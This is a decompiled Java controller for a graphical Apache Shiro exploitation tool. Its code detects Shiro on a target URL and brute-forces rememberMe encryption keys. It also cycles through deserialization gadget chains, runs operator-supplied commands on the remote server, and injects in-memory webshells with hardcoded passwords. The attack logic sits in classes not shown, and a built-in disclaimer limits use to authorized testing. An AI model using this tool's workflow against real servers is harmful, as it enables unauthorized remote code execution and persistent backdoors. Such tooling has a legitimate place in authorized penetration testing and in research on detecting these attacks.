/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  javafx.application.Platform
 *  javafx.collections.FXCollections
 *  javafx.fxml.FXML
 *  javafx.geometry.Insets
 *  javafx.geometry.Pos
 *  javafx.scene.Node
 *  javafx.scene.control.Alert
 *  javafx.scene.control.Alert$AlertType
 *  javafx.scene.control.Button
 *  javafx.scene.control.CheckBox
 *  javafx.scene.control.ChoiceBox
 *  javafx.scene.control.ComboBox
 *  javafx.scene.control.DialogPane
 *  javafx.scene.control.Label
 *  javafx.scene.control.MenuItem
 *  javafx.scene.control.RadioButton
 *  javafx.scene.control.TabPane
 *  javafx.scene.control.TextArea
 *  javafx.scene.control.TextField
 *  javafx.scene.control.ToggleGroup
 *  javafx.scene.layout.GridPane
 *  javafx.scene.layout.HBox
 *  javafx.scene.layout.Region
 *  javafx.scene.layout.VBox
 *  javafx.scene.text.Font
 *  javafx.scene.text.FontPosture
 *  javafx.scene.text.FontWeight
 *  javafx.stage.Window
 */
package com.sma11new.controller;

import com.sma11new.config.Config;
import com.sma11new.exp.shiro.ShiroAttack;
import com.sma11new.exp.shiro.attack.memShell.MemBytes;
import com.sma11new.utils.HttpMsgUtil;
import java.net.Authenticator;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.CheckBox;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.ComboBox;
import javafx.scene.control.DialogPane;
import javafx.scene.control.Label;
import javafx.scene.control.MenuItem;
import javafx.scene.control.RadioButton;
import javafx.scene.control.TabPane;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.ToggleGroup;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Region;
import javafx.scene.layout.VBox;
import javafx.scene.text.Font;
import javafx.scene.text.FontPosture;
import javafx.scene.text.FontWeight;
import javafx.stage.Window;

public class ShiroController {
    @FXML
    private MenuItem proxySetupBtn;
    @FXML
    private Label proxyStatusLabel;
    @FXML
    private MenuItem timeoutSetupBtn;
    @FXML
    public TextArea basicInfo;
    @FXML
    private TextField urlInput;
    @FXML
    private TabPane execCmdTabPane;
    @FXML
    private TextField cmdInput;
    @FXML
    public TextArea cmdOutput;
    @FXML
    private Button execCmdBtn;
    @FXML
    public TextArea memShellInjectInfo;
    @FXML
    private Button memShellInjectBtn;
    @FXML
    private ChoiceBox<String> memShellChoiceBox;
    @FXML
    private TextField memShellPathInput;
    @FXML
    private TextField cookieFlagInput;
    @FXML
    private CheckBox complexReqCheckBox;
    @FXML
    public CheckBox httpsReqCheckBox;
    @FXML
    public CheckBox keepCookieCheckBox;
    @FXML
    private TextArea complexReqTextArea;
    @FXML
    public TextField keyInput;
    @FXML
    private Button CheckCurrentKeyBtn;
    @FXML
    private Button enumAllKeysBtn;
    @FXML
    public ChoiceBox<String> chainChoiceBox;
    @FXML
    public ChoiceBox<String> echoChoiceBox;
    @FXML
    private CheckBox AES_GCM_ModeCheckBox;
    @FXML
    private Button enumAllChainsBtn;
    @FXML
    private Button CheckCurrentChainBtn;
    private boolean isShiro = false;
    private volatile boolean stopCheckAllKeys = false;
    private volatile boolean stopCheckAllChains = false;
    public static Map<String, Object> proxySettingInfo = new HashMap<String, Object>();

    @FXML
    public void initialize() {
        this.initializeCommon();
        this.initToolbar();
    }

    protected void initializeCommon() {
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutils1");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutils1_183");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutilsAttrCompare");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutilsAttrCompare_183");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutilsObjectToStringComparator");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutilsObjectToStringComparator_183");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutilsPropertySource");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutilsPropertySource_183");
        this.chainChoiceBox.getItems().add((Object)"CommonsCollections2");
        this.chainChoiceBox.getItems().add((Object)"CommonsCollections3");
        this.chainChoiceBox.getItems().add((Object)"CommonsCollectionsK1");
        this.chainChoiceBox.getItems().add((Object)"CommonsCollectionsK2");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutilsString");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutilsString_183");
        this.chainChoiceBox.getItems().add((Object)"CommonsBeanutilsString_192s");
        this.echoChoiceBox.getItems().add((Object)"AllEcho");
        this.echoChoiceBox.getItems().add((Object)"TomcatEcho");
        this.echoChoiceBox.getItems().add((Object)"SpringEcho");
        this.chainChoiceBox.setValue((Object)"CommonsBeanutils1");
        this.echoChoiceBox.setValue((Object)"TomcatEcho");
        this.memShellChoiceBox.getItems().addAll((Collection)MemBytes.MEM_MAP.keySet().stream().sorted().collect(Collectors.toList()));
        this.memShellChoiceBox.setValue((Object)"\u54e5\u65af\u62c9[Filter]");
        this.basicInfo.appendText("\u63d0\u793a\uff1a\u666e\u901aurl\u548c\u590d\u6742\u8bf7\u6c42\u4e8c\u9009\u4e00\uff0c\u590d\u6742\u8bf7\u6c42\u4e2d\u6240\u6709\u6570\u636e\u4f1a\u88ab\u643a\u5e26\uff0chttps\u7684\u590d\u6742\u8bf7\u6c42\u9700\u8981\u52fe\u9009https\n\n");
        this.memShellInjectInfo.appendText("\u63d0\u793a\uff1a\u4f18\u5148\u6ce8\u5165Filter\u5185\u5b58\u9a6c\uff0c\u6210\u529f\u7387\u8f83\u9ad8\u3002\n\n");
        this.AES_GCM_ModeCheckBox.selectedProperty().addListener((observable, oldValue, newValue) -> {
            ShiroAttack.AES_GCM_MODE = newValue;
        });
        this.complexReqCheckBox.selectedProperty().addListener((observable, oldValue, newValue) -> {
            this.complexReqTextArea.setDisable(newValue == false);
            this.httpsReqCheckBox.setDisable(newValue == false);
            this.keepCookieCheckBox.setDisable(newValue == false);
            this.urlInput.setDisable(newValue.booleanValue());
            ShiroAttack.complexReq = newValue;
        });
    }

    @FXML
    private void checkKey() {
        this.basicInfo.appendText("\n\u3010\u5f00\u59cb\u9a8c\u8bc1Shiro\u53cakey\u3011 " + this.urlInput.getText().trim() + "\n");
        this.checkIsShiro(isShiroResult -> {
            if (isShiroResult) {
                new Thread(() -> {
                    String tmpUrl;
                    String url = this.urlInput.getText().trim();
                    String cookieFlag = this.cookieFlagInput.getText().trim();
                    String key2 = this.keyInput.getText().trim();
                    if (this.complexReqCheckBox.isSelected()) {
                        ShiroAttack.complexReq = true;
                        ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(this.complexReqTextArea.getText(), this.httpsReqCheckBox.isSelected(), this.keepCookieCheckBox.isSelected());
                        tmpUrl = (String)ShiroAttack.reqMsg.get("url");
                    } else {
                        tmpUrl = url;
                    }
                    boolean keyValid = ShiroAttack.checkKey(tmpUrl, cookieFlag, key2);
                    Platform.runLater(() -> {
                        if (keyValid) {
                            this.basicInfo.appendText("[+++]  \u53d1\u73b0Key\uff1a" + key2 + "\n");
                        } else {
                            this.basicInfo.appendText("[-]  Key\u9519\u8bef\uff1a" + key2 + "\n");
                        }
                    });
                }).start();
            }
        });
    }

    @FXML
    public void checkAllKeys() {
        this.basicInfo.appendText("\n\u3010\u5f00\u59cb\u7206\u7834key\u3011 " + this.urlInput.getText().trim() + "\n");
        this.checkIsShiro(isShiroResult -> {
            if (isShiroResult) {
                String tmpUrl;
                List<String> allKeys = ShiroAttack.getAllKeys();
                String url = this.urlInput.getText().trim();
                String cookieFlag = this.cookieFlagInput.getText().trim();
                if (this.complexReqCheckBox.isSelected()) {
                    ShiroAttack.complexReq = true;
                    ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(this.complexReqTextArea.getText(), this.httpsReqCheckBox.isSelected(), this.keepCookieCheckBox.isSelected());
                    tmpUrl = (String)ShiroAttack.reqMsg.get("url");
                } else {
                    tmpUrl = url;
                }
                Thread thread2 = new Thread(() -> {
                    for (String key2 : allKeys) {
                        if (this.complexReqCheckBox.isSelected()) {
                            ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(this.complexReqTextArea.getText(), this.httpsReqCheckBox.isSelected(), this.keepCookieCheckBox.isSelected());
                        }
                        if (this.stopCheckAllKeys) {
                            this.stopCheckAllKeys = false;
                            Platform.runLater(() -> this.basicInfo.appendText("\u5df2\u505c\u6b62\u68c0\u6d4b\u6240\u6709Keys\n"));
                            return;
                        }
                        boolean isCorrectKey = ShiroAttack.checkKey(tmpUrl, cookieFlag, key2);
                        String keyResult = key2;
                        Platform.runLater(() -> {
                            if (isCorrectKey) {
                                this.basicInfo.appendText("[+++]  \u53d1\u73b0Key\uff1a" + keyResult + "\n");
                                this.keyInput.setText(keyResult);
                            } else {
                                this.basicInfo.appendText("[-]  Key\u4e0d\u6b63\u786e\uff1a" + keyResult + "\n");
                            }
                        });
                        if (isCorrectKey) {
                            return;
                        }
                        try {
                            Thread.sleep(200L);
                        }
                        catch (InterruptedException e2) {
                            Thread.currentThread().interrupt();
                            return;
                        }
                    }
                    Platform.runLater(() -> this.basicInfo.appendText("[-]  \u5171\u7206\u7834 " + allKeys.size() + " \uff0c\u672a\u53d1\u73b0key\n"));
                });
                thread2.start();
            }
        });
    }

    @FXML
    private void checkChain() {
        this.basicInfo.appendText("\n\u3010\u5f00\u59cb\u9a8c\u8bc1\u5229\u7528\u94fe\u3011 " + this.urlInput.getText().trim() + "\n");
        if (this.complexReqCheckBox.isSelected()) {
            // empty if block
        }
        if (!this.isShiro) {
            Platform.runLater(() -> this.basicInfo.appendText("[-]  \u5148\u68c0\u6d4b\u786e\u8ba4\u5b58\u5728Shiro\u53caKey\n"));
            return;
        }
        new Thread(() -> {
            String url = this.urlInput.getText().trim();
            String cookieFlag = this.cookieFlagInput.getText().trim();
            String key2 = this.keyInput.getText().trim();
            String chain = ((String)this.chainChoiceBox.getValue()).trim();
            String echo = ((String)this.echoChoiceBox.getValue()).trim();
            if (this.complexReqCheckBox.isSelected()) {
                ShiroAttack.complexReq = true;
                ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(this.complexReqTextArea.getText(), this.httpsReqCheckBox.isSelected(), this.keepCookieCheckBox.isSelected());
                url = (String)ShiroAttack.reqMsg.get("url");
            }
            boolean isChainValid = ShiroAttack.checkChain(url, cookieFlag, key2, chain, echo);
            Platform.runLater(() -> {
                if (isChainValid) {
                    this.basicInfo.appendText("[+++]  \u53d1\u73b0\u5229\u7528\u94fe\u53ca\u56de\u663e\uff01 \u94fe\uff1a" + chain + "  \u56de\u663e\uff1a" + echo + "\n");
                } else {
                    this.basicInfo.appendText("[-]  \u5229\u7528\u94fe\u53ca\u56de\u663e\u65e0\u6cd5\u4f7f\u7528\n");
                }
            });
        }).start();
    }

    @FXML
    private void checkAllChains() {
        String tmpUrl;
        this.basicInfo.appendText("\n\u3010\u5f00\u59cb\u7206\u7834\u5229\u7528\u94fe\u53ca\u56de\u663e\u3011 " + this.urlInput.getText().trim() + "\n");
        if (!this.isShiro) {
            Platform.runLater(() -> this.basicInfo.appendText("[-]  \u5148\u68c0\u6d4b\u786e\u8ba4\u5b58\u5728Shiro\u53caKey\n"));
            return;
        }
        String url = this.urlInput.getText().trim();
        String cookieFlag = this.cookieFlagInput.getText().trim();
        String key2 = this.keyInput.getText().trim();
        if (this.complexReqCheckBox.isSelected()) {
            ShiroAttack.complexReq = true;
            ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(this.complexReqTextArea.getText(), this.httpsReqCheckBox.isSelected(), this.keepCookieCheckBox.isSelected());
            tmpUrl = (String)ShiroAttack.reqMsg.get("url");
        } else {
            tmpUrl = url;
        }
        Thread thread2 = new Thread(() -> {
            for (String echo : this.echoChoiceBox.getItems()) {
                for (String chain : this.chainChoiceBox.getItems()) {
                    if (this.complexReqCheckBox.isSelected()) {
                        ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(this.complexReqTextArea.getText(), this.httpsReqCheckBox.isSelected(), this.keepCookieCheckBox.isSelected());
                    }
                    if (this.stopCheckAllChains) {
                        this.stopCheckAllChains = false;
                        Platform.runLater(() -> this.basicInfo.appendText("\u5df2\u505c\u6b62\u68c0\u6d4b\u6240\u6709\u5229\u7528\u94fe\u53ca\u56de\u663e\n"));
                        return;
                    }
                    boolean isChainValid = ShiroAttack.checkChain(tmpUrl, cookieFlag, key2, chain, echo);
                    String chainFinal = chain;
                    String echoFinal = echo;
                    Platform.runLater(() -> {
                        if (isChainValid) {
                            this.basicInfo.appendText("[+++]  \u53d1\u73b0\u5229\u7528\u94fe\u53ca\u56de\u663e\uff01 \u94fe\uff1a" + chainFinal + "  \u56de\u663e\uff1a" + echoFinal + "\n");
                            this.chainChoiceBox.setValue((Object)chainFinal);
                            this.echoChoiceBox.setValue((Object)echoFinal);
                        } else {
                            this.basicInfo.appendText("[-]  \u5c1d\u8bd5\u56de\u663e\uff1a" + echoFinal + "  \u94fe\uff1a" + chainFinal + "\n");
                        }
                    });
                    try {
                        Thread.sleep(300L);
                    }
                    catch (InterruptedException e2) {
                        Thread.currentThread().interrupt();
                        return;
                    }
                }
            }
            if (this.basicInfo.getText().contains("\u53d1\u73b0\u5229\u7528\u94fe\u53ca\u56de\u663e")) {
                Platform.runLater(() -> this.basicInfo.appendText("[+++]  \u53d1\u73b0\u5229\u7528\u94fe\u53ca\u56de\u663e\uff0c\u81ea\u884c\u9009\u62e9\u4f7f\u7528\n"));
            } else {
                Platform.runLater(() -> this.basicInfo.appendText("[-]  \u672a\u53d1\u73b0\u5229\u7528\u94fe\u53ca\u56de\u663e\n"));
            }
        });
        thread2.start();
    }

    @FXML
    private void execCmd() {
        String tmpUrl;
        String url = this.urlInput.getText().trim();
        String cookieFlag = this.cookieFlagInput.getText().trim();
        String key2 = this.keyInput.getText().trim();
        String chain = ((String)this.chainChoiceBox.getValue()).trim();
        String echo = ((String)this.echoChoiceBox.getValue()).trim();
        String cmd = this.cmdInput.getText().trim();
        if (this.complexReqCheckBox.isSelected()) {
            ShiroAttack.complexReq = true;
            ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(this.complexReqTextArea.getText(), this.httpsReqCheckBox.isSelected(), this.keepCookieCheckBox.isSelected());
            tmpUrl = (String)ShiroAttack.reqMsg.get("url");
        } else {
            tmpUrl = url;
        }
        Thread thread2 = new Thread(() -> {
            String result = ShiroAttack.execCmd(tmpUrl, cookieFlag, key2, chain, echo, cmd);
            Platform.runLater(() -> this.cmdOutput.appendText("\u3010+\u3011 \u6267\u884c\u7ed3\u679c\uff1a\n" + result + "\n\n"));
        });
        thread2.start();
    }

    @FXML
    private void injectMemShell() {
        String tmpUrl;
        String url = this.urlInput.getText().trim();
        String cookieFlag = this.cookieFlagInput.getText().trim();
        String key2 = this.keyInput.getText().trim();
        String chain = ((String)this.chainChoiceBox.getValue()).trim();
        String memShell = ((String)this.memShellChoiceBox.getValue()).trim();
        String path2 = this.memShellPathInput.getText().trim();
        if (this.complexReqCheckBox.isSelected()) {
            ShiroAttack.complexReq = true;
            ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(this.complexReqTextArea.getText(), this.httpsReqCheckBox.isSelected(), this.keepCookieCheckBox.isSelected());
            tmpUrl = (String)ShiroAttack.reqMsg.get("url");
        } else {
            tmpUrl = url;
        }
        Thread thread2 = new Thread(() -> {
            String result = ShiroAttack.injectMemShell(tmpUrl, cookieFlag, key2, chain, memShell, path2, "");
            Platform.runLater(() -> {
                if (result.contains("\u6ce8\u5165\u5931\u8d25")) {
                    this.memShellInjectInfo.appendText(result + "\n\n");
                } else if (memShell.contains("\u54e5\u65af\u62c9")) {
                    this.memShellInjectInfo.appendText("\u3010+\u3011 " + memShell + " \u5185\u5b58\u9a6c\u6ce8\u5165\u6210\u529f\uff1a" + result + "  \u5bc6\u7801\uff1apass \u5bc6\u94a5\uff1aikun123\n\n");
                } else {
                    this.memShellInjectInfo.appendText("\u3010+\u3011 " + memShell + " \u5185\u5b58\u9a6c\u6ce8\u5165\u6210\u529f\uff1a" + result + "  \u5bc6\u7801\uff1aikun123\n\n");
                }
            });
        });
        thread2.start();
    }

    @FXML
    private void stopCheckAllKeys() {
        this.stopCheckAllKeys = true;
    }

    @FXML
    private void stopCheckAllChains() {
        this.stopCheckAllChains = true;
    }

    private void checkIsShiro(ShiroCheckCallback callback) {
        new Thread(() -> {
            String url = this.urlInput.getText().trim();
            String cookieFlag = this.cookieFlagInput.getText().trim();
            if (this.complexReqCheckBox.isSelected()) {
                ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(this.complexReqTextArea.getText(), this.httpsReqCheckBox.isSelected(), this.keepCookieCheckBox.isSelected());
                url = (String)ShiroAttack.reqMsg.get("url");
            }
            this.isShiro = ShiroAttack.checkIsShiro(url, cookieFlag);
            Platform.runLater(() -> {
                if (this.isShiro) {
                    this.basicInfo.appendText("[+++]  \u68c0\u6d4b\u5230Shiro\u6846\u67b6\uff01\n");
                } else {
                    this.basicInfo.appendText("[-]  \u672a\u68c0\u6d4b\u5230Shiro\u6846\u67b6\n");
                }
                callback.onCheckComplete(this.isShiro);
            });
        }).start();
    }

    @FXML
    public void disclaimer() {
        Alert alert = new Alert(Alert.AlertType.NONE);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest(e2 -> window.hide());
        DialogPane dialogPane = new DialogPane();
        Label label = new Label("\u672c\u5de5\u5177\u4ec5\u7528\u4e8e\u5185\u90e8\u7f51\u7edc\u5b89\u5168\u81ea\u67e5\u53ca\u6388\u6743\u9879\u76ee\n\n\t\u8bf7\u52ff\u975e\u6cd5\u4f7f\u7528\uff0c\u5426\u5219\u540e\u679c\u81ea\u8d1f\uff01");
        label.setStyle("-fx-text-fill: #d71f0e; -fx-font-weight: bold; -fx-alignment: center;");
        dialogPane.setContent((Node)label);
        alert.setDialogPane(dialogPane);
        alert.showAndWait();
    }

    @FXML
    public void about() {
        Alert alert = new Alert(Alert.AlertType.NONE);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest(e2 -> window.hide());
        DialogPane dialogPane = new DialogPane();
        VBox vBox = new VBox();
        vBox.setSpacing(5.0);
        Label label = new Label("Pyke\u7efc\u5408\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u884d\u751f\u5de5\u5177");
        label.setMaxWidth(700.0);
        label.setWrapText(true);
        label.setAlignment(Pos.CENTER);
        TextArea textArea = new TextArea();
        textArea.setWrapText(true);
        textArea.setEditable(false);
        textArea.setMaxWidth(700.0);
        textArea.setMaxHeight(300.0);
        textArea.appendText(Config.UPDATEINFO);
        Font font = Font.font((String)"", (FontWeight)FontWeight.BOLD, (FontPosture)FontPosture.REGULAR, (double)15.0);
        label.setFont(font);
        Region spacer = new Region();
        spacer.setPrefHeight(10.0);
        vBox.getChildren().addAll((Object[])new Node[]{label, spacer, textArea});
        dialogPane.setContent((Node)vBox);
        alert.setDialogPane(dialogPane);
        alert.showAndWait();
    }

    private void initToolbar() {
        this.proxySetupBtn.setOnAction(event -> {
            Alert inputDialog = new Alert(Alert.AlertType.NONE);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest(e2 -> window.hide());
            inputDialog.setTitle("\u4ee3\u7406\u8bbe\u7f6e");
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("\u542f\u7528");
            RadioButton disableRadio = new RadioButton("\u7981\u7528");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            disableRadio.setSelected(true);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0);
            statusHbox.getChildren().add((Object)enableRadio);
            statusHbox.getChildren().add((Object)disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0);
            proxyGridPane.setPadding(new Insets(20.0, 20.0, 0.0, 10.0));
            Label typeLabel = new Label("\u7c7b\u578b\uff1a");
            ComboBox typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList((Object[])new String[]{"HTTP", "SOCKS"}));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP\u5730\u5740\uff1a");
            TextField IPText = new TextField("127.0.0.1");
            Label PortLabel = new Label("\u7aef\u53e3\uff1a");
            TextField PortText = new TextField("8080");
            Label userNameLabel = new Label("\u7528\u6237\u540d\uff1a");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("\u5bc6\u7801\uff1a");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("\u53d6\u6d88");
            Button saveBtn = new Button("\u4fdd\u5b58");
            try {
                Proxy proxy2 = (Proxy)proxySettingInfo.get("proxy");
                if (proxy2 != null) {
                    enableRadio.setSelected(true);
                } else {
                    disableRadio.setSelected(true);
                }
                if (proxySettingInfo.size() > 0) {
                    String type2 = (String)proxySettingInfo.get("type");
                    if (type2.equals("HTTP")) {
                        typeCombo.getSelectionModel().select(0);
                    } else if (type2.equals("SOCKS")) {
                        typeCombo.getSelectionModel().select(1);
                    }
                    String ip = (String)proxySettingInfo.get("ip");
                    String port = (String)proxySettingInfo.get("port");
                    IPText.setText(ip);
                    PortText.setText(port);
                    String username = (String)proxySettingInfo.get("username");
                    String password = (String)proxySettingInfo.get("password");
                    userNameText.setText(username);
                    passwordText.setText(password);
                }
            }
            catch (Exception var) {
                this.proxyStatusLabel.setText("<\u4ee3\u7406\u52a0\u8f7d\u5931\u8d25>");
            }
            saveBtn.setOnAction(e2 -> {
                if (disableRadio.isSelected()) {
                    proxySettingInfo.put("proxy", null);
                    this.proxyStatusLabel.setText("");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {
                    if (!userNameText.getText().trim().equals("")) {
                        final String proxyUser = userNameText.getText().trim();
                        final String type2 = passwordText.getText();
                        Authenticator.setDefault(new Authenticator(){

                            @Override
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(proxyUser, type2.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault(null);
                    }
                    proxySettingInfo.put("username", userNameText.getText());
                    proxySettingInfo.put("password", passwordText.getText());
                    InetSocketAddress proxyAddr = new InetSocketAddress(IPText.getText(), Integer.parseInt(PortText.getText()));
                    proxySettingInfo.put("ip", IPText.getText());
                    proxySettingInfo.put("port", PortText.getText());
                    String proxy_type = typeCombo.getValue().toString();
                    proxySettingInfo.put("type", proxy_type);
                    if (proxy_type.equals("HTTP")) {
                        Proxy proxy2 = new Proxy(Proxy.Type.HTTP, proxyAddr);
                        proxySettingInfo.put("proxy", proxy2);
                    } else if (proxy_type.equals("SOCKS")) {
                        Proxy proxy3 = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                        proxySettingInfo.put("proxy", proxy3);
                    }
                    String proxyInfo = proxySettingInfo.get("type") + "://" + proxySettingInfo.get("ip") + ":" + proxySettingInfo.get("port");
                    this.proxyStatusLabel.setText("<\u4ee3\u7406\u751f\u6548\u4e2d> " + proxyInfo);
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }
            });
            cancelBtn.setOnAction(e2 -> inputDialog.getDialogPane().getScene().getWindow().hide());
            proxyGridPane.add((Node)statusHbox, 1, 0);
            proxyGridPane.add((Node)typeLabel, 0, 1);
            proxyGridPane.add((Node)typeCombo, 1, 1);
            proxyGridPane.add((Node)IPLabel, 0, 2);
            proxyGridPane.add((Node)IPText, 1, 2);
            proxyGridPane.add((Node)PortLabel, 0, 3);
            proxyGridPane.add((Node)PortText, 1, 3);
            proxyGridPane.add((Node)userNameLabel, 0, 4);
            proxyGridPane.add((Node)userNameText, 1, 4);
            proxyGridPane.add((Node)passwordLabel, 0, 5);
            proxyGridPane.add((Node)passwordText, 1, 5);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add((Object)cancelBtn);
            buttonBox.getChildren().add((Object)saveBtn);
            GridPane.setColumnSpan((Node)buttonBox, (Integer)2);
            proxyGridPane.add((Node)buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent((Node)proxyGridPane);
            inputDialog.showAndWait();
        });
        this.timeoutSetupBtn.setOnAction(event -> {
            Alert inputDialog = new Alert(Alert.AlertType.NONE);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest(e2 -> window.hide());
            inputDialog.setTitle("\u8d85\u65f6\u8bbe\u7f6e");
            GridPane timeoutGridPane = new GridPane();
            timeoutGridPane.setVgap(15.0);
            timeoutGridPane.setPadding(new Insets(20.0, 20.0, 0.0, 10.0));
            Label connectTimeoutLabel = new Label("\u8bf7\u6c42\u8d85\u65f6/s\uff1a");
            TextField connectTimeout = new TextField("" + Config.CONNECT_TIME_OUT);
            Label readTimeoutLabel = new Label("\u8bfb\u53d6\u8d85\u65f6/s\uff1a");
            TextField readTimeout = new TextField("" + Config.READ_TIME_OUT);
            Button restoreDefaultBtn = new Button("\u6062\u590d\u9ed8\u8ba4");
            Button saveBtn = new Button("\u4fdd\u5b58\u8bbe\u7f6e");
            saveBtn.setOnAction(e2 -> {
                Config.CONNECT_TIME_OUT = Integer.parseInt(connectTimeout.getText().trim());
                Config.READ_TIME_OUT = Integer.parseInt(readTimeout.getText().trim());
                inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            restoreDefaultBtn.setOnAction(e2 -> {
                connectTimeout.setText("5");
                readTimeout.setText("10");
            });
            timeoutGridPane.add((Node)connectTimeoutLabel, 0, 1);
            timeoutGridPane.add((Node)connectTimeout, 1, 1);
            timeoutGridPane.add((Node)readTimeoutLabel, 0, 2);
            timeoutGridPane.add((Node)readTimeout, 1, 2);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add((Object)restoreDefaultBtn);
            buttonBox.getChildren().add((Object)saveBtn);
            GridPane.setColumnSpan((Node)buttonBox, (Integer)2);
            timeoutGridPane.add((Node)buttonBox, 0, 3);
            inputDialog.getDialogPane().setContent((Node)timeoutGridPane);
            inputDialog.showAndWait();
        });
    }

    public void setProxyStatusLabel(String value) {
        this.proxyStatusLabel.setText(value);
    }

    @FunctionalInterface
    public static interface ShiroCheckCallback {
        public void onCheckComplete(boolean var1);
    }
}

